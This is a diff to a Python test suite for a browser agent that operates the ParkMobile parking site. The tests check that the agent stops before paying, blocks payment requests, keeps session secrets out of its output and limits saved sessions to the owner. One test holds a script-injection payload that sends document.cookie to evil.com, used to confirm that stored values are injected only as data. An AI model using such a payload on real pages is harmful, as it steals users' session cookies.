@@ -237,13 +237,15 @@ def el(kind, text="", aria="", attrs=None, picked=False, go=None):
 
 CHECKOUT = {   # signed-in checkout (a GUESS at ParkMobile's real one): duration chips, saved car
     "facts": facts(path="/v2/parking/checkout", text="How long?\n1 hour\n2 hours\n3 hours\nVehicle\n"
-                   "DEMO123 Honda Civic\nParking $4.00\nStart parking"),
+                   "DEMO123 Honda Civic\nContinue"),
     "els": [el("button", "1 hour"), el("button", "2 hours"), el("button", "3 hours"),
-            el("radio", "DEMO123 Honda Civic"), el("button", "Start parking", go="PAID")],
+            el("radio", "DEMO123 Honda Civic"), el("button", "Continue", go="review")],
 }
-REVIEW = {"facts": facts(path="/v2/parking/review", text="Review\nVehicle DEMO123\nParking $4.00\nTotal $4.35",
+REVIEW = {"facts": facts(path="/v2/parking/review", text="Review\nVehicle DEMO123\nParking $4.00\nTotal $4.35"
+                         "\nVisa ending in 4242\nStart parking",
                          lines=["Review", "Vehicle DEMO123", "Parking $4.00", "Total $4.35"]),
-          "els": [el("button", "Pay $4.35", go="PAID")]}
+          "els": [el("radio", "Change vehicle DEMO123"), el("button", "Continue"),
+                  el("button", "Start parking", go="PAID"), el("button", "Pay $4.35", go="PAID")]}
 CODE = {"facts": facts(path="/v2/auth/us/login", text="Enter the code we sent to your email",
                        inputs=[{"type": "text", "autocomplete": "one-time-code", "aria": "Code"}]), "els": []}
 
@@ -280,6 +282,8 @@ class FakeLocator:
             return e["picked"]
         if js == rs.PM_OPTIONS_JS:
             return e.get("options", [])
+        if js == rs.PM_BUTTON_JS:
+            return {"text": e["text"], "aria": e["aria"]}
         raise AssertionError(js)
 
     def inner_text(self, timeout=None):
@@ -306,7 +310,7 @@ class FakeLocator:
 
 class FakePage:
     """search -> (zone, result) -> zone details -> (Park here) -> ``after`` (a state dict)."""
-    def __init__(self, after, park_label="Park here"):
+    def __init__(self, after, park_label="Park here", more=None):
         self.after, self.state = after, "search"
         self.url, self.typed, self.clicked = "about:blank", [], []
         self.states = {
@@ -314,6 +318,8 @@ class FakePage:
             "zone": {"facts": facts(path="/v2/parking/zone-details", zone_details=True, lines=ZONE_LINES),
                      "els": []},
             "after": after,
+            "review": REVIEW,
+            **(more or {}),
         }
         self.search = el("input", attrs=SEARCH_ATTRS)
         self.result = el("button", "P 91987 Atlanta, GA - Off St Operator", go="zone")
@@ -371,8 +377,9 @@ def run_fake(monkeypatch, page, robot=False, state=None, tmp_path=None):
     launched = {}
 
     def launch(p, on_route, **kw):
-        launched.update(kw)
+        launched.update(kw, on_route=on_route)
         return browser, context
+    context.add_init_script = lambda script: launched.setdefault("init_scripts", []).append(script)
     monkeypatch.setattr(rs, "_launch", launch)
     monkeypatch.setattr(rs, "start_screencast", lambda *a: True)
     monkeypatch.setattr(rs, "page_state", lambda pg: {"text_len": 50, "title": "", "text": "", "markers": [],
@@ -425,22 +432,101 @@ def test_guest_flow_stops_at_add_email(monkeypatch):
     json.dumps(out)
 
 
-def test_signed_in_run_reaches_the_price_and_refuses_start_parking(monkeypatch, tmp_path):
+def test_signed_in_run_reaches_the_price_then_clicks_nothing(monkeypatch, tmp_path):
     page = FakePage(CHECKOUT)
     out, lines, launched = run_fake(monkeypatch, page, state=SESSION, tmp_path=tmp_path)
     assert out["status"] == "ready_to_pay" and out["paid"] is False and out["session"] == "loaded"
-    assert out["price_text"] == "Parking $4.00" and out["stopped_at"] == op.PM_STOPPED_AT["pay_button"]
-    assert out["refused"] == [{"action": "click", "label": "Start parking"}]
-    assert "Start parking" not in page.clicked                     # the guard held
-    assert page.clicked == ["P 91987 Atlanta, GA - Off St Operator", "Park here", "2 hours", "DEMO123 Honda Civic"]
+    assert out["price_text"] == "Parking $4.00" and out["stopped_at"] == op.PM_STOPPED_AT["review"]
+    # duration, saved car, Continue; then the price showed and NOTHING else was clicked
+    assert page.clicked == ["P 91987 Atlanta, GA - Off St Operator", "Park here", "2 hours",
+                            "DEMO123 Honda Civic", "Continue"]
+    assert page.state == "review" and out["refused"] == []
     assert out["duration_set"] and out["plate_set"] and page.typed == ["91987"]
     assert out["steps"] == ["open", "zone", "pick", "park_here", "duration", "plate"]
     assert [l["step"] for l in lines][0] == "session" and lines[-1]["step"] == "stop_pay"
     # the session went in, filtered to *.parkmobile.io, and no cookie/token comes back out
     assert launched["storage_state"] == {"cookies": [SESSION["cookies"][0]], "origins": [SESSION["origins"][0]]}
     blob = json.dumps(out) + json.dumps(lines)
-    for secret in ("SECRET-COOKIE-123", "SECRET-TOKEN-789", "pm_session"):
+    for secret in ("SECRET-COOKIE-123", "SECRET-TOKEN-789", "pm_session", "SECRET-SESSION-000"):
         assert secret not in blob
+
+
+def test_price_after_duration_stops_before_the_car_and_continue(monkeypatch, tmp_path):
+    priced = {"facts": facts(path="/v2/parking/checkout", text="2 hours\nParking $4.00\nDEMO123 Honda Civic"),
+              "els": [el("radio", "DEMO123 Honda Civic"), el("button", "Continue", go="review")]}
+    checkout = {"facts": CHECKOUT["facts"],
+                "els": [el("button", "2 hours", go="priced"), el("radio", "DEMO123 Honda Civic"),
+                        el("button", "Continue", go="review")]}
+    page = FakePage(checkout, more={"priced": priced})
+    out, _, _ = run_fake(monkeypatch, page, state=SESSION, tmp_path=tmp_path)
+    assert out["status"] == "ready_to_pay" and out["stopped_at"] == op.PM_STOPPED_AT["price"]
+    assert page.clicked[-1] == "2 hours" and not out["plate_set"]   # no car, no Continue after the price
+
+
+def test_forward_button_is_an_exact_allowlist(monkeypatch, tmp_path):
+    only_pay = {"facts": CHECKOUT["facts"],
+                "els": [el("button", "2 hours"), el("radio", "DEMO123 Honda Civic"),
+                        el("button", "Continue", aria="Start parking", go="PAID"),
+                        el("button", "Start parking", go="PAID"), el("button", "Continue to payment", go="PAID")]}
+    page = FakePage(only_pay)
+    out, _, _ = run_fake(monkeypatch, page, state=SESSION, tmp_path=tmp_path)
+    assert out["status"] == "failed" and "Start parking" not in page.clicked
+    assert page.clicked[-2:] == ["2 hours", "DEMO123 Honda Civic"]
+    assert op.pm_forward_ok({"text": " Continue ", "aria": "continue"}) and op.pm_forward_ok({"text": "Next"})
+    for bad in ({"text": "Continue", "aria": "Start parking"}, {"text": "Continue to payment"},
+                {"text": "Start parking"}, {"text": "Pay"}, {}, None):
+        assert not op.pm_forward_ok(bad)
+
+
+def test_start_parking_requests_are_blocked_in_the_browser(monkeypatch, tmp_path):
+    out, _, launched = run_fake(monkeypatch, FakePage({"facts": GUEST, "els": []}), state=SESSION, tmp_path=tmp_path)
+    calls = []
+
+    class Route:
+        def __init__(self, method, url, nav=False):
+            self.request = types.SimpleNamespace(
+                method=method, url=url, resource_type="fetch", is_navigation_request=lambda: nav,
+                frame=types.SimpleNamespace(parent_frame=None))
+
+        def abort(self, *a):
+            calls.append(("abort", self.request.url))
+
+        def fulfill(self, **kw):
+            calls.append(("fulfill", self.request.url))
+
+        def continue_(self):
+            calls.append(("continue", self.request.url))
+    on_route = launched["on_route"]
+    before = len(out["fenced_requests"])
+    on_route(Route("POST", "https://app.parkmobile.io/api/v2/parking/start?zone=91987&token=abc"))
+    on_route(Route("PUT", "https://api.parkmobile.io/sessions/123/extend"))
+    on_route(Route("POST", "https://api.parkmobile.io/v1/payments"))
+    on_route(Route("POST", "https://app.parkmobile.io/api/zones/search"))
+    on_route(Route("GET", "https://app.parkmobile.io/api/v2/parking/start"))
+    assert [c[0] for c in calls] == ["abort", "abort", "abort", "continue", "continue"]
+    new = out["fenced_requests"][before:]
+    assert [b["method"] for b in new] == ["POST", "PUT", "POST"]
+    assert new[0]["url"] == "https://app.parkmobile.io/api/v2/parking/start"   # path only, no query
+    assert "token" not in json.dumps(new)
+
+
+def test_session_storage_is_injected_as_data(monkeypatch, tmp_path):
+    evil = 'x"); fetch("https://evil.com/?" + document.cookie); ("'
+    state = {**SESSION, "sessionStorage": [
+        {"origin": "https://app.parkmobile.io", "items": [{"name": "auth", "value": "SECRET-SESSION-000"},
+                                                          {"name": "evil", "value": evil}]},
+        {"origin": "https://evil.com", "items": [{"name": "x", "value": "y"}]}]}
+    out, lines, launched = run_fake(monkeypatch, FakePage({"facts": GUEST, "els": []}), state=state, tmp_path=tmp_path)
+    (script,) = launched["init_scripts"]
+    assert script.startswith('(() => { if (location.origin !== "https://app.parkmobile.io") return;')
+    i = script.index("JSON.parse(") + len("JSON.parse(")
+    literal, end = json.JSONDecoder().raw_decode(script, i)       # one JS string literal ...
+    assert script[end:end + 2] == ");"
+    assert json.loads(literal) == [{"name": "auth", "value": "SECRET-SESSION-000"},
+                                   {"name": "evil", "value": evil}]   # ... holding the JSON data
+    assert "evil.com/?" not in script.replace(json.dumps(literal), "")   # nowhere outside it
+    blob = json.dumps(out) + json.dumps(lines)
+    assert "SECRET-SESSION-000" not in blob and out["session"] == "loaded"
 
 
 def test_signed_out_session_stops_with_needs_sign_in(monkeypatch, tmp_path):
@@ -456,12 +542,13 @@ def test_code_screen_stops_with_needs_verification(monkeypatch, tmp_path):
     assert page.typed == ["91987"]                                  # never a code
 
 
-def test_review_screen_is_ready_to_pay(monkeypatch, tmp_path):
+def test_review_screen_is_ready_to_pay_and_nothing_is_clicked(monkeypatch, tmp_path):
     page = FakePage(REVIEW)
     out, _, _ = run_fake(monkeypatch, page, state=SESSION, tmp_path=tmp_path)
     assert out["status"] == "ready_to_pay" and out["price_text"] == "Parking $4.00"
     assert out["stopped_at"] == op.PM_STOPPED_AT["review"] and out["refused"] == []
-    assert out["plate_set"] and not out["duration_set"] and "Pay $4.35" not in page.clicked
+    assert page.clicked[-1] == "Park here"                         # no car, Continue or Pay after
+    assert not out["plate_set"] and not out["duration_set"]
 
 
 def test_card_form_is_never_touched(monkeypatch, tmp_path):
@@ -521,6 +608,19 @@ def test_session_helpers():
     assert op.pm_screen(facts(text="Promo code", inputs=[{"aria": "Promo code"}])) != "verification"
     assert op.pm_has_card_fields(facts(pay_frames=1)) and not op.pm_has_card_fields(GUEST)
     assert op.pm_click_refused("Park now") and op.pm_click_refused("Add card")
+    assert op.pm_price_visible(facts(text="Visa ending in 4242")) and op.pm_price_visible(facts(text="Total $4.35"))
+    assert not op.pm_price_visible(GUEST)
+    assert op.pm_request_blocked("POST", "https://app.parkmobile.io/api/startParkingSession")
+    assert op.pm_request_blocked("DELETE", "https://app.parkmobile.io/api/order/1")
+    assert not op.pm_request_blocked("POST", "https://app.parkmobile.io/api/parking/quote")
+    assert not op.pm_request_blocked("POST", "https://app.launchdarkly.com/parking/start")   # not ParkMobile
+    assert not op.pm_request_blocked("GET", "https://app.parkmobile.io/api/checkout")
+    assert op.pm_session_items({"sessionStorage": [{"origin": "https://app.parkmobile.io",
+                                                    "items": [{"name": "a", "value": "b"}, {"name": 1, "value": "x"}]}]}) \
+        == [{"name": "a", "value": "b"}]
+    assert op.pm_filter_state({"origins": [{"origin": "https://app.parkmobile.io", "indexedDB": [{"name": "db"}],
+                                            "junk": 1}]}) == \
+        {"cookies": [], "origins": [{"origin": "https://app.parkmobile.io", "indexedDB": [{"name": "db"}]}]}
 
 
 # --- server.py /operate/stream adapter "parkmobile" -----------------------------------------------
@@ -586,18 +686,22 @@ def test_session_file_is_mounted_read_only_for_parkmobile_only(monkeypatch, tmp_
     c = TestClient(srv.app)
     h = {"Authorization": "Bearer tok"}
     c.post("/operate/stream", headers=h, json={"adapter": "parkmobile", "url": ENTRY, "zone": "91987",
-                                                "plate": "DEMO123", "hours": 2})
+                                                "plate": "DEMO123", "hours": 2, "use_session": True})
     c.post("/operate/stream", headers=h, json={"url": "https://scansafe-demo-sites.vercel.app/dogwood/app?s=t",
                                                 "plate": "GA1", "hours": 2})
     c.post("/run/stream", headers=h, json={"url": "https://example.com/"})
-    pm_cmd, dog_cmd, scan_cmd = cmds
+    pm_cmd, dog_cmd, scan_cmd = cmds[:3]
     i = pm_cmd.index("-v")
     assert pm_cmd[i + 1] == f"{state}:/run/pm_state.json:ro" and pm_cmd.index(srv.IMAGE) > i
     assert "-v" not in dog_cmd and "-v" not in scan_cmd
     assert not any("SECRET" in part for part in pm_cmd)            # a path, never the contents
+    for asks in ({}, {"use_session": False}, {"use_session": "true"}, {"use_session": 1}):
+        c.post("/operate/stream", headers=h, json={"adapter": "parkmobile", "url": ENTRY, "zone": "91987",
+                                                    "plate": "DEMO123", "hours": 2, **asks})
+        assert "-v" not in cmds[-1]                                # not asked for: guest run
     monkeypatch.setenv("PARKMOBILE_STATE_FILE", str(tmp_path / "missing.json"))
     c.post("/operate/stream", headers=h, json={"adapter": "parkmobile", "url": ENTRY, "zone": "91987",
-                                                "plate": "DEMO123", "hours": 2})
+                                                "plate": "DEMO123", "hours": 2, "use_session": True})
     assert "-v" not in cmds[-1]
     monkeypatch.setenv("PARKMOBILE_STATE_FILE", "relative/path.json")
     assert srv._parkmobile_mounts() == ()
@@ -620,11 +724,28 @@ def test_server_refuses_bad_parkmobile_requests(monkeypatch, body):
 
 # --- agent side -----------------------------------------------------------------------------------
 
+def test_session_only_for_the_owner(monkeypatch):
+    url = "https://app.parkmobile.io/v2/parking?zone=91987"
+    monkeypatch.delenv("PARKMOBILE_OWNER_PHONE", raising=False)
+    assert pm.parkmobile_job({"scan_url": url, "phone": "+14045550123"})["use_session"] is False
+    monkeypatch.setenv("PARKMOBILE_OWNER_PHONE", "(404) 555-0123")
+    assert pm.parkmobile_job({"scan_url": url, "phone": "+14045550123"})["use_session"] is True
+    assert pm.parkmobile_job({"scan_url": url, "phone": "+1 404 555 0123"})["use_session"] is True
+    for other in ("+14045550124", "+44404555012", "", None, "4045550123x", "+1404555012345678"):
+        assert pm.parkmobile_job({"scan_url": url, "phone": other})["use_session"] is False
+    assert pm.parkmobile_job({"scan_url": url})["use_session"] is False
+    assert pm.e164("0014045550123") == "+14045550123" and pm.e164("14045550123") == "+14045550123"
+    assert pm.e164("555-0123") is None and pm.e164(4045550123) is None
+    monkeypatch.setenv("PARKMOBILE_OWNER_PHONE", "not a phone")
+    assert pm.is_session_owner("not a phone") is False
+
+
 def test_parkmobile_job(monkeypatch):
     monkeypatch.delenv("PARKMOBILE_DEMO_PLATE", raising=False)
+    monkeypatch.delenv("PARKMOBILE_OWNER_PHONE", raising=False)
     j = pm.parkmobile_job({"scan_url": "https://app.parkmobile.io/v2/parking?zone=91987"})
     assert j == {"url": ENTRY, "scan_url": "https://app.parkmobile.io/v2/parking?zone=91987", "zone": "91987",
-                 "plate": "DEMO123", "minutes": 120}
+                 "plate": "DEMO123", "minutes": 120, "use_session": False}
     assert pm.parkmobile_job({"scan_url": ZONE_PAGE})["url"] == ZONE_PAGE
     assert pm.parkmobile_job({"scan_url": ZONE_PAGE})["zone"] is None
     for url in ("https://app.parkmobile.io/v2/parking", "http://app.parkmobile.io/v2/parking?zone=91987",
@@ -686,7 +807,11 @@ def test_parkmobile_stream_posts_the_adapter_body(monkeypatch):
     assert out == result and steps == ["zone"]
     assert str(seen[0].url) == "http://sandbox.test/operate/stream"
     assert json.loads(seen[0].content) == {"adapter": "parkmobile", "url": ENTRY, "zone": "91987",
-                                           "plate": "DEMO123", "minutes": 120}
+                                           "plate": "DEMO123", "minutes": 120, "use_session": False}
+    seen.clear()
+    tools.parkmobile_stream(ENTRY, "91987", "DEMO123", 120, on_frame=lambda b: None, use_session=True,
+                            client=httpx.Client(transport=httpx.MockTransport(handler)))
+    assert json.loads(seen[0].content)["use_session"] is True
     paid = httpx.Client(transport=httpx.MockTransport(lambda r: httpx.Response(
         200, content=json.dumps({"type": "result", "data": {"status": "paid"}}).encode())))
     assert tools.parkmobile_stream(ENTRY, "91987", "DEMO123", 120, on_frame=lambda b: None,
@@ -717,8 +842,9 @@ def test_run_parkmobile_call_greets_then_reads_back(monkeypatch):
 def test_parkmobile_live_streams_without_the_meter_banner(monkeypatch):
     ai = tda.agent(monkeypatch)
 
-    def fake(url, zone, plate, minutes, on_frame, on_nav=None, on_step=None, should_stop=None):
-        assert (url, zone, plate, minutes) == (ENTRY, "91987", "DEMO123", 120)
+    def fake(url, zone, plate, minutes, on_frame, on_nav=None, on_step=None, should_stop=None,
+             use_session=None):
+        assert (url, zone, plate, minutes, use_session) == (ENTRY, "91987", "DEMO123", 120, True)
         on_frame(tda.jpeg())
         on_nav("https://app.parkmobile.io/v2/parking/zone-details?areaNo=10891987")
         on_step("Tapping Park here", "park_here")
@@ -726,7 +852,7 @@ def test_parkmobile_live_streams_without_the_meter_banner(monkeypatch):
     monkeypatch.setattr(ai, "parkmobile_stream", fake)
     call = tda.real_call(monkeypatch, lambda *a, **k: pytest.fail("dogwood stream"))
     monkeypatch.setattr(ai, "parkmobile_stream", fake)
-    out = asyncio.run(call.parkmobile_live(JOB))
+    out = asyncio.run(call.parkmobile_live({**JOB, "use_session": True}))
     v = call.video
     assert out == {"status": "needs_sign_in"} and v.state == "checking" and v.meter is None
     assert v.live is not None and v.live_step == "Tapping Park here"
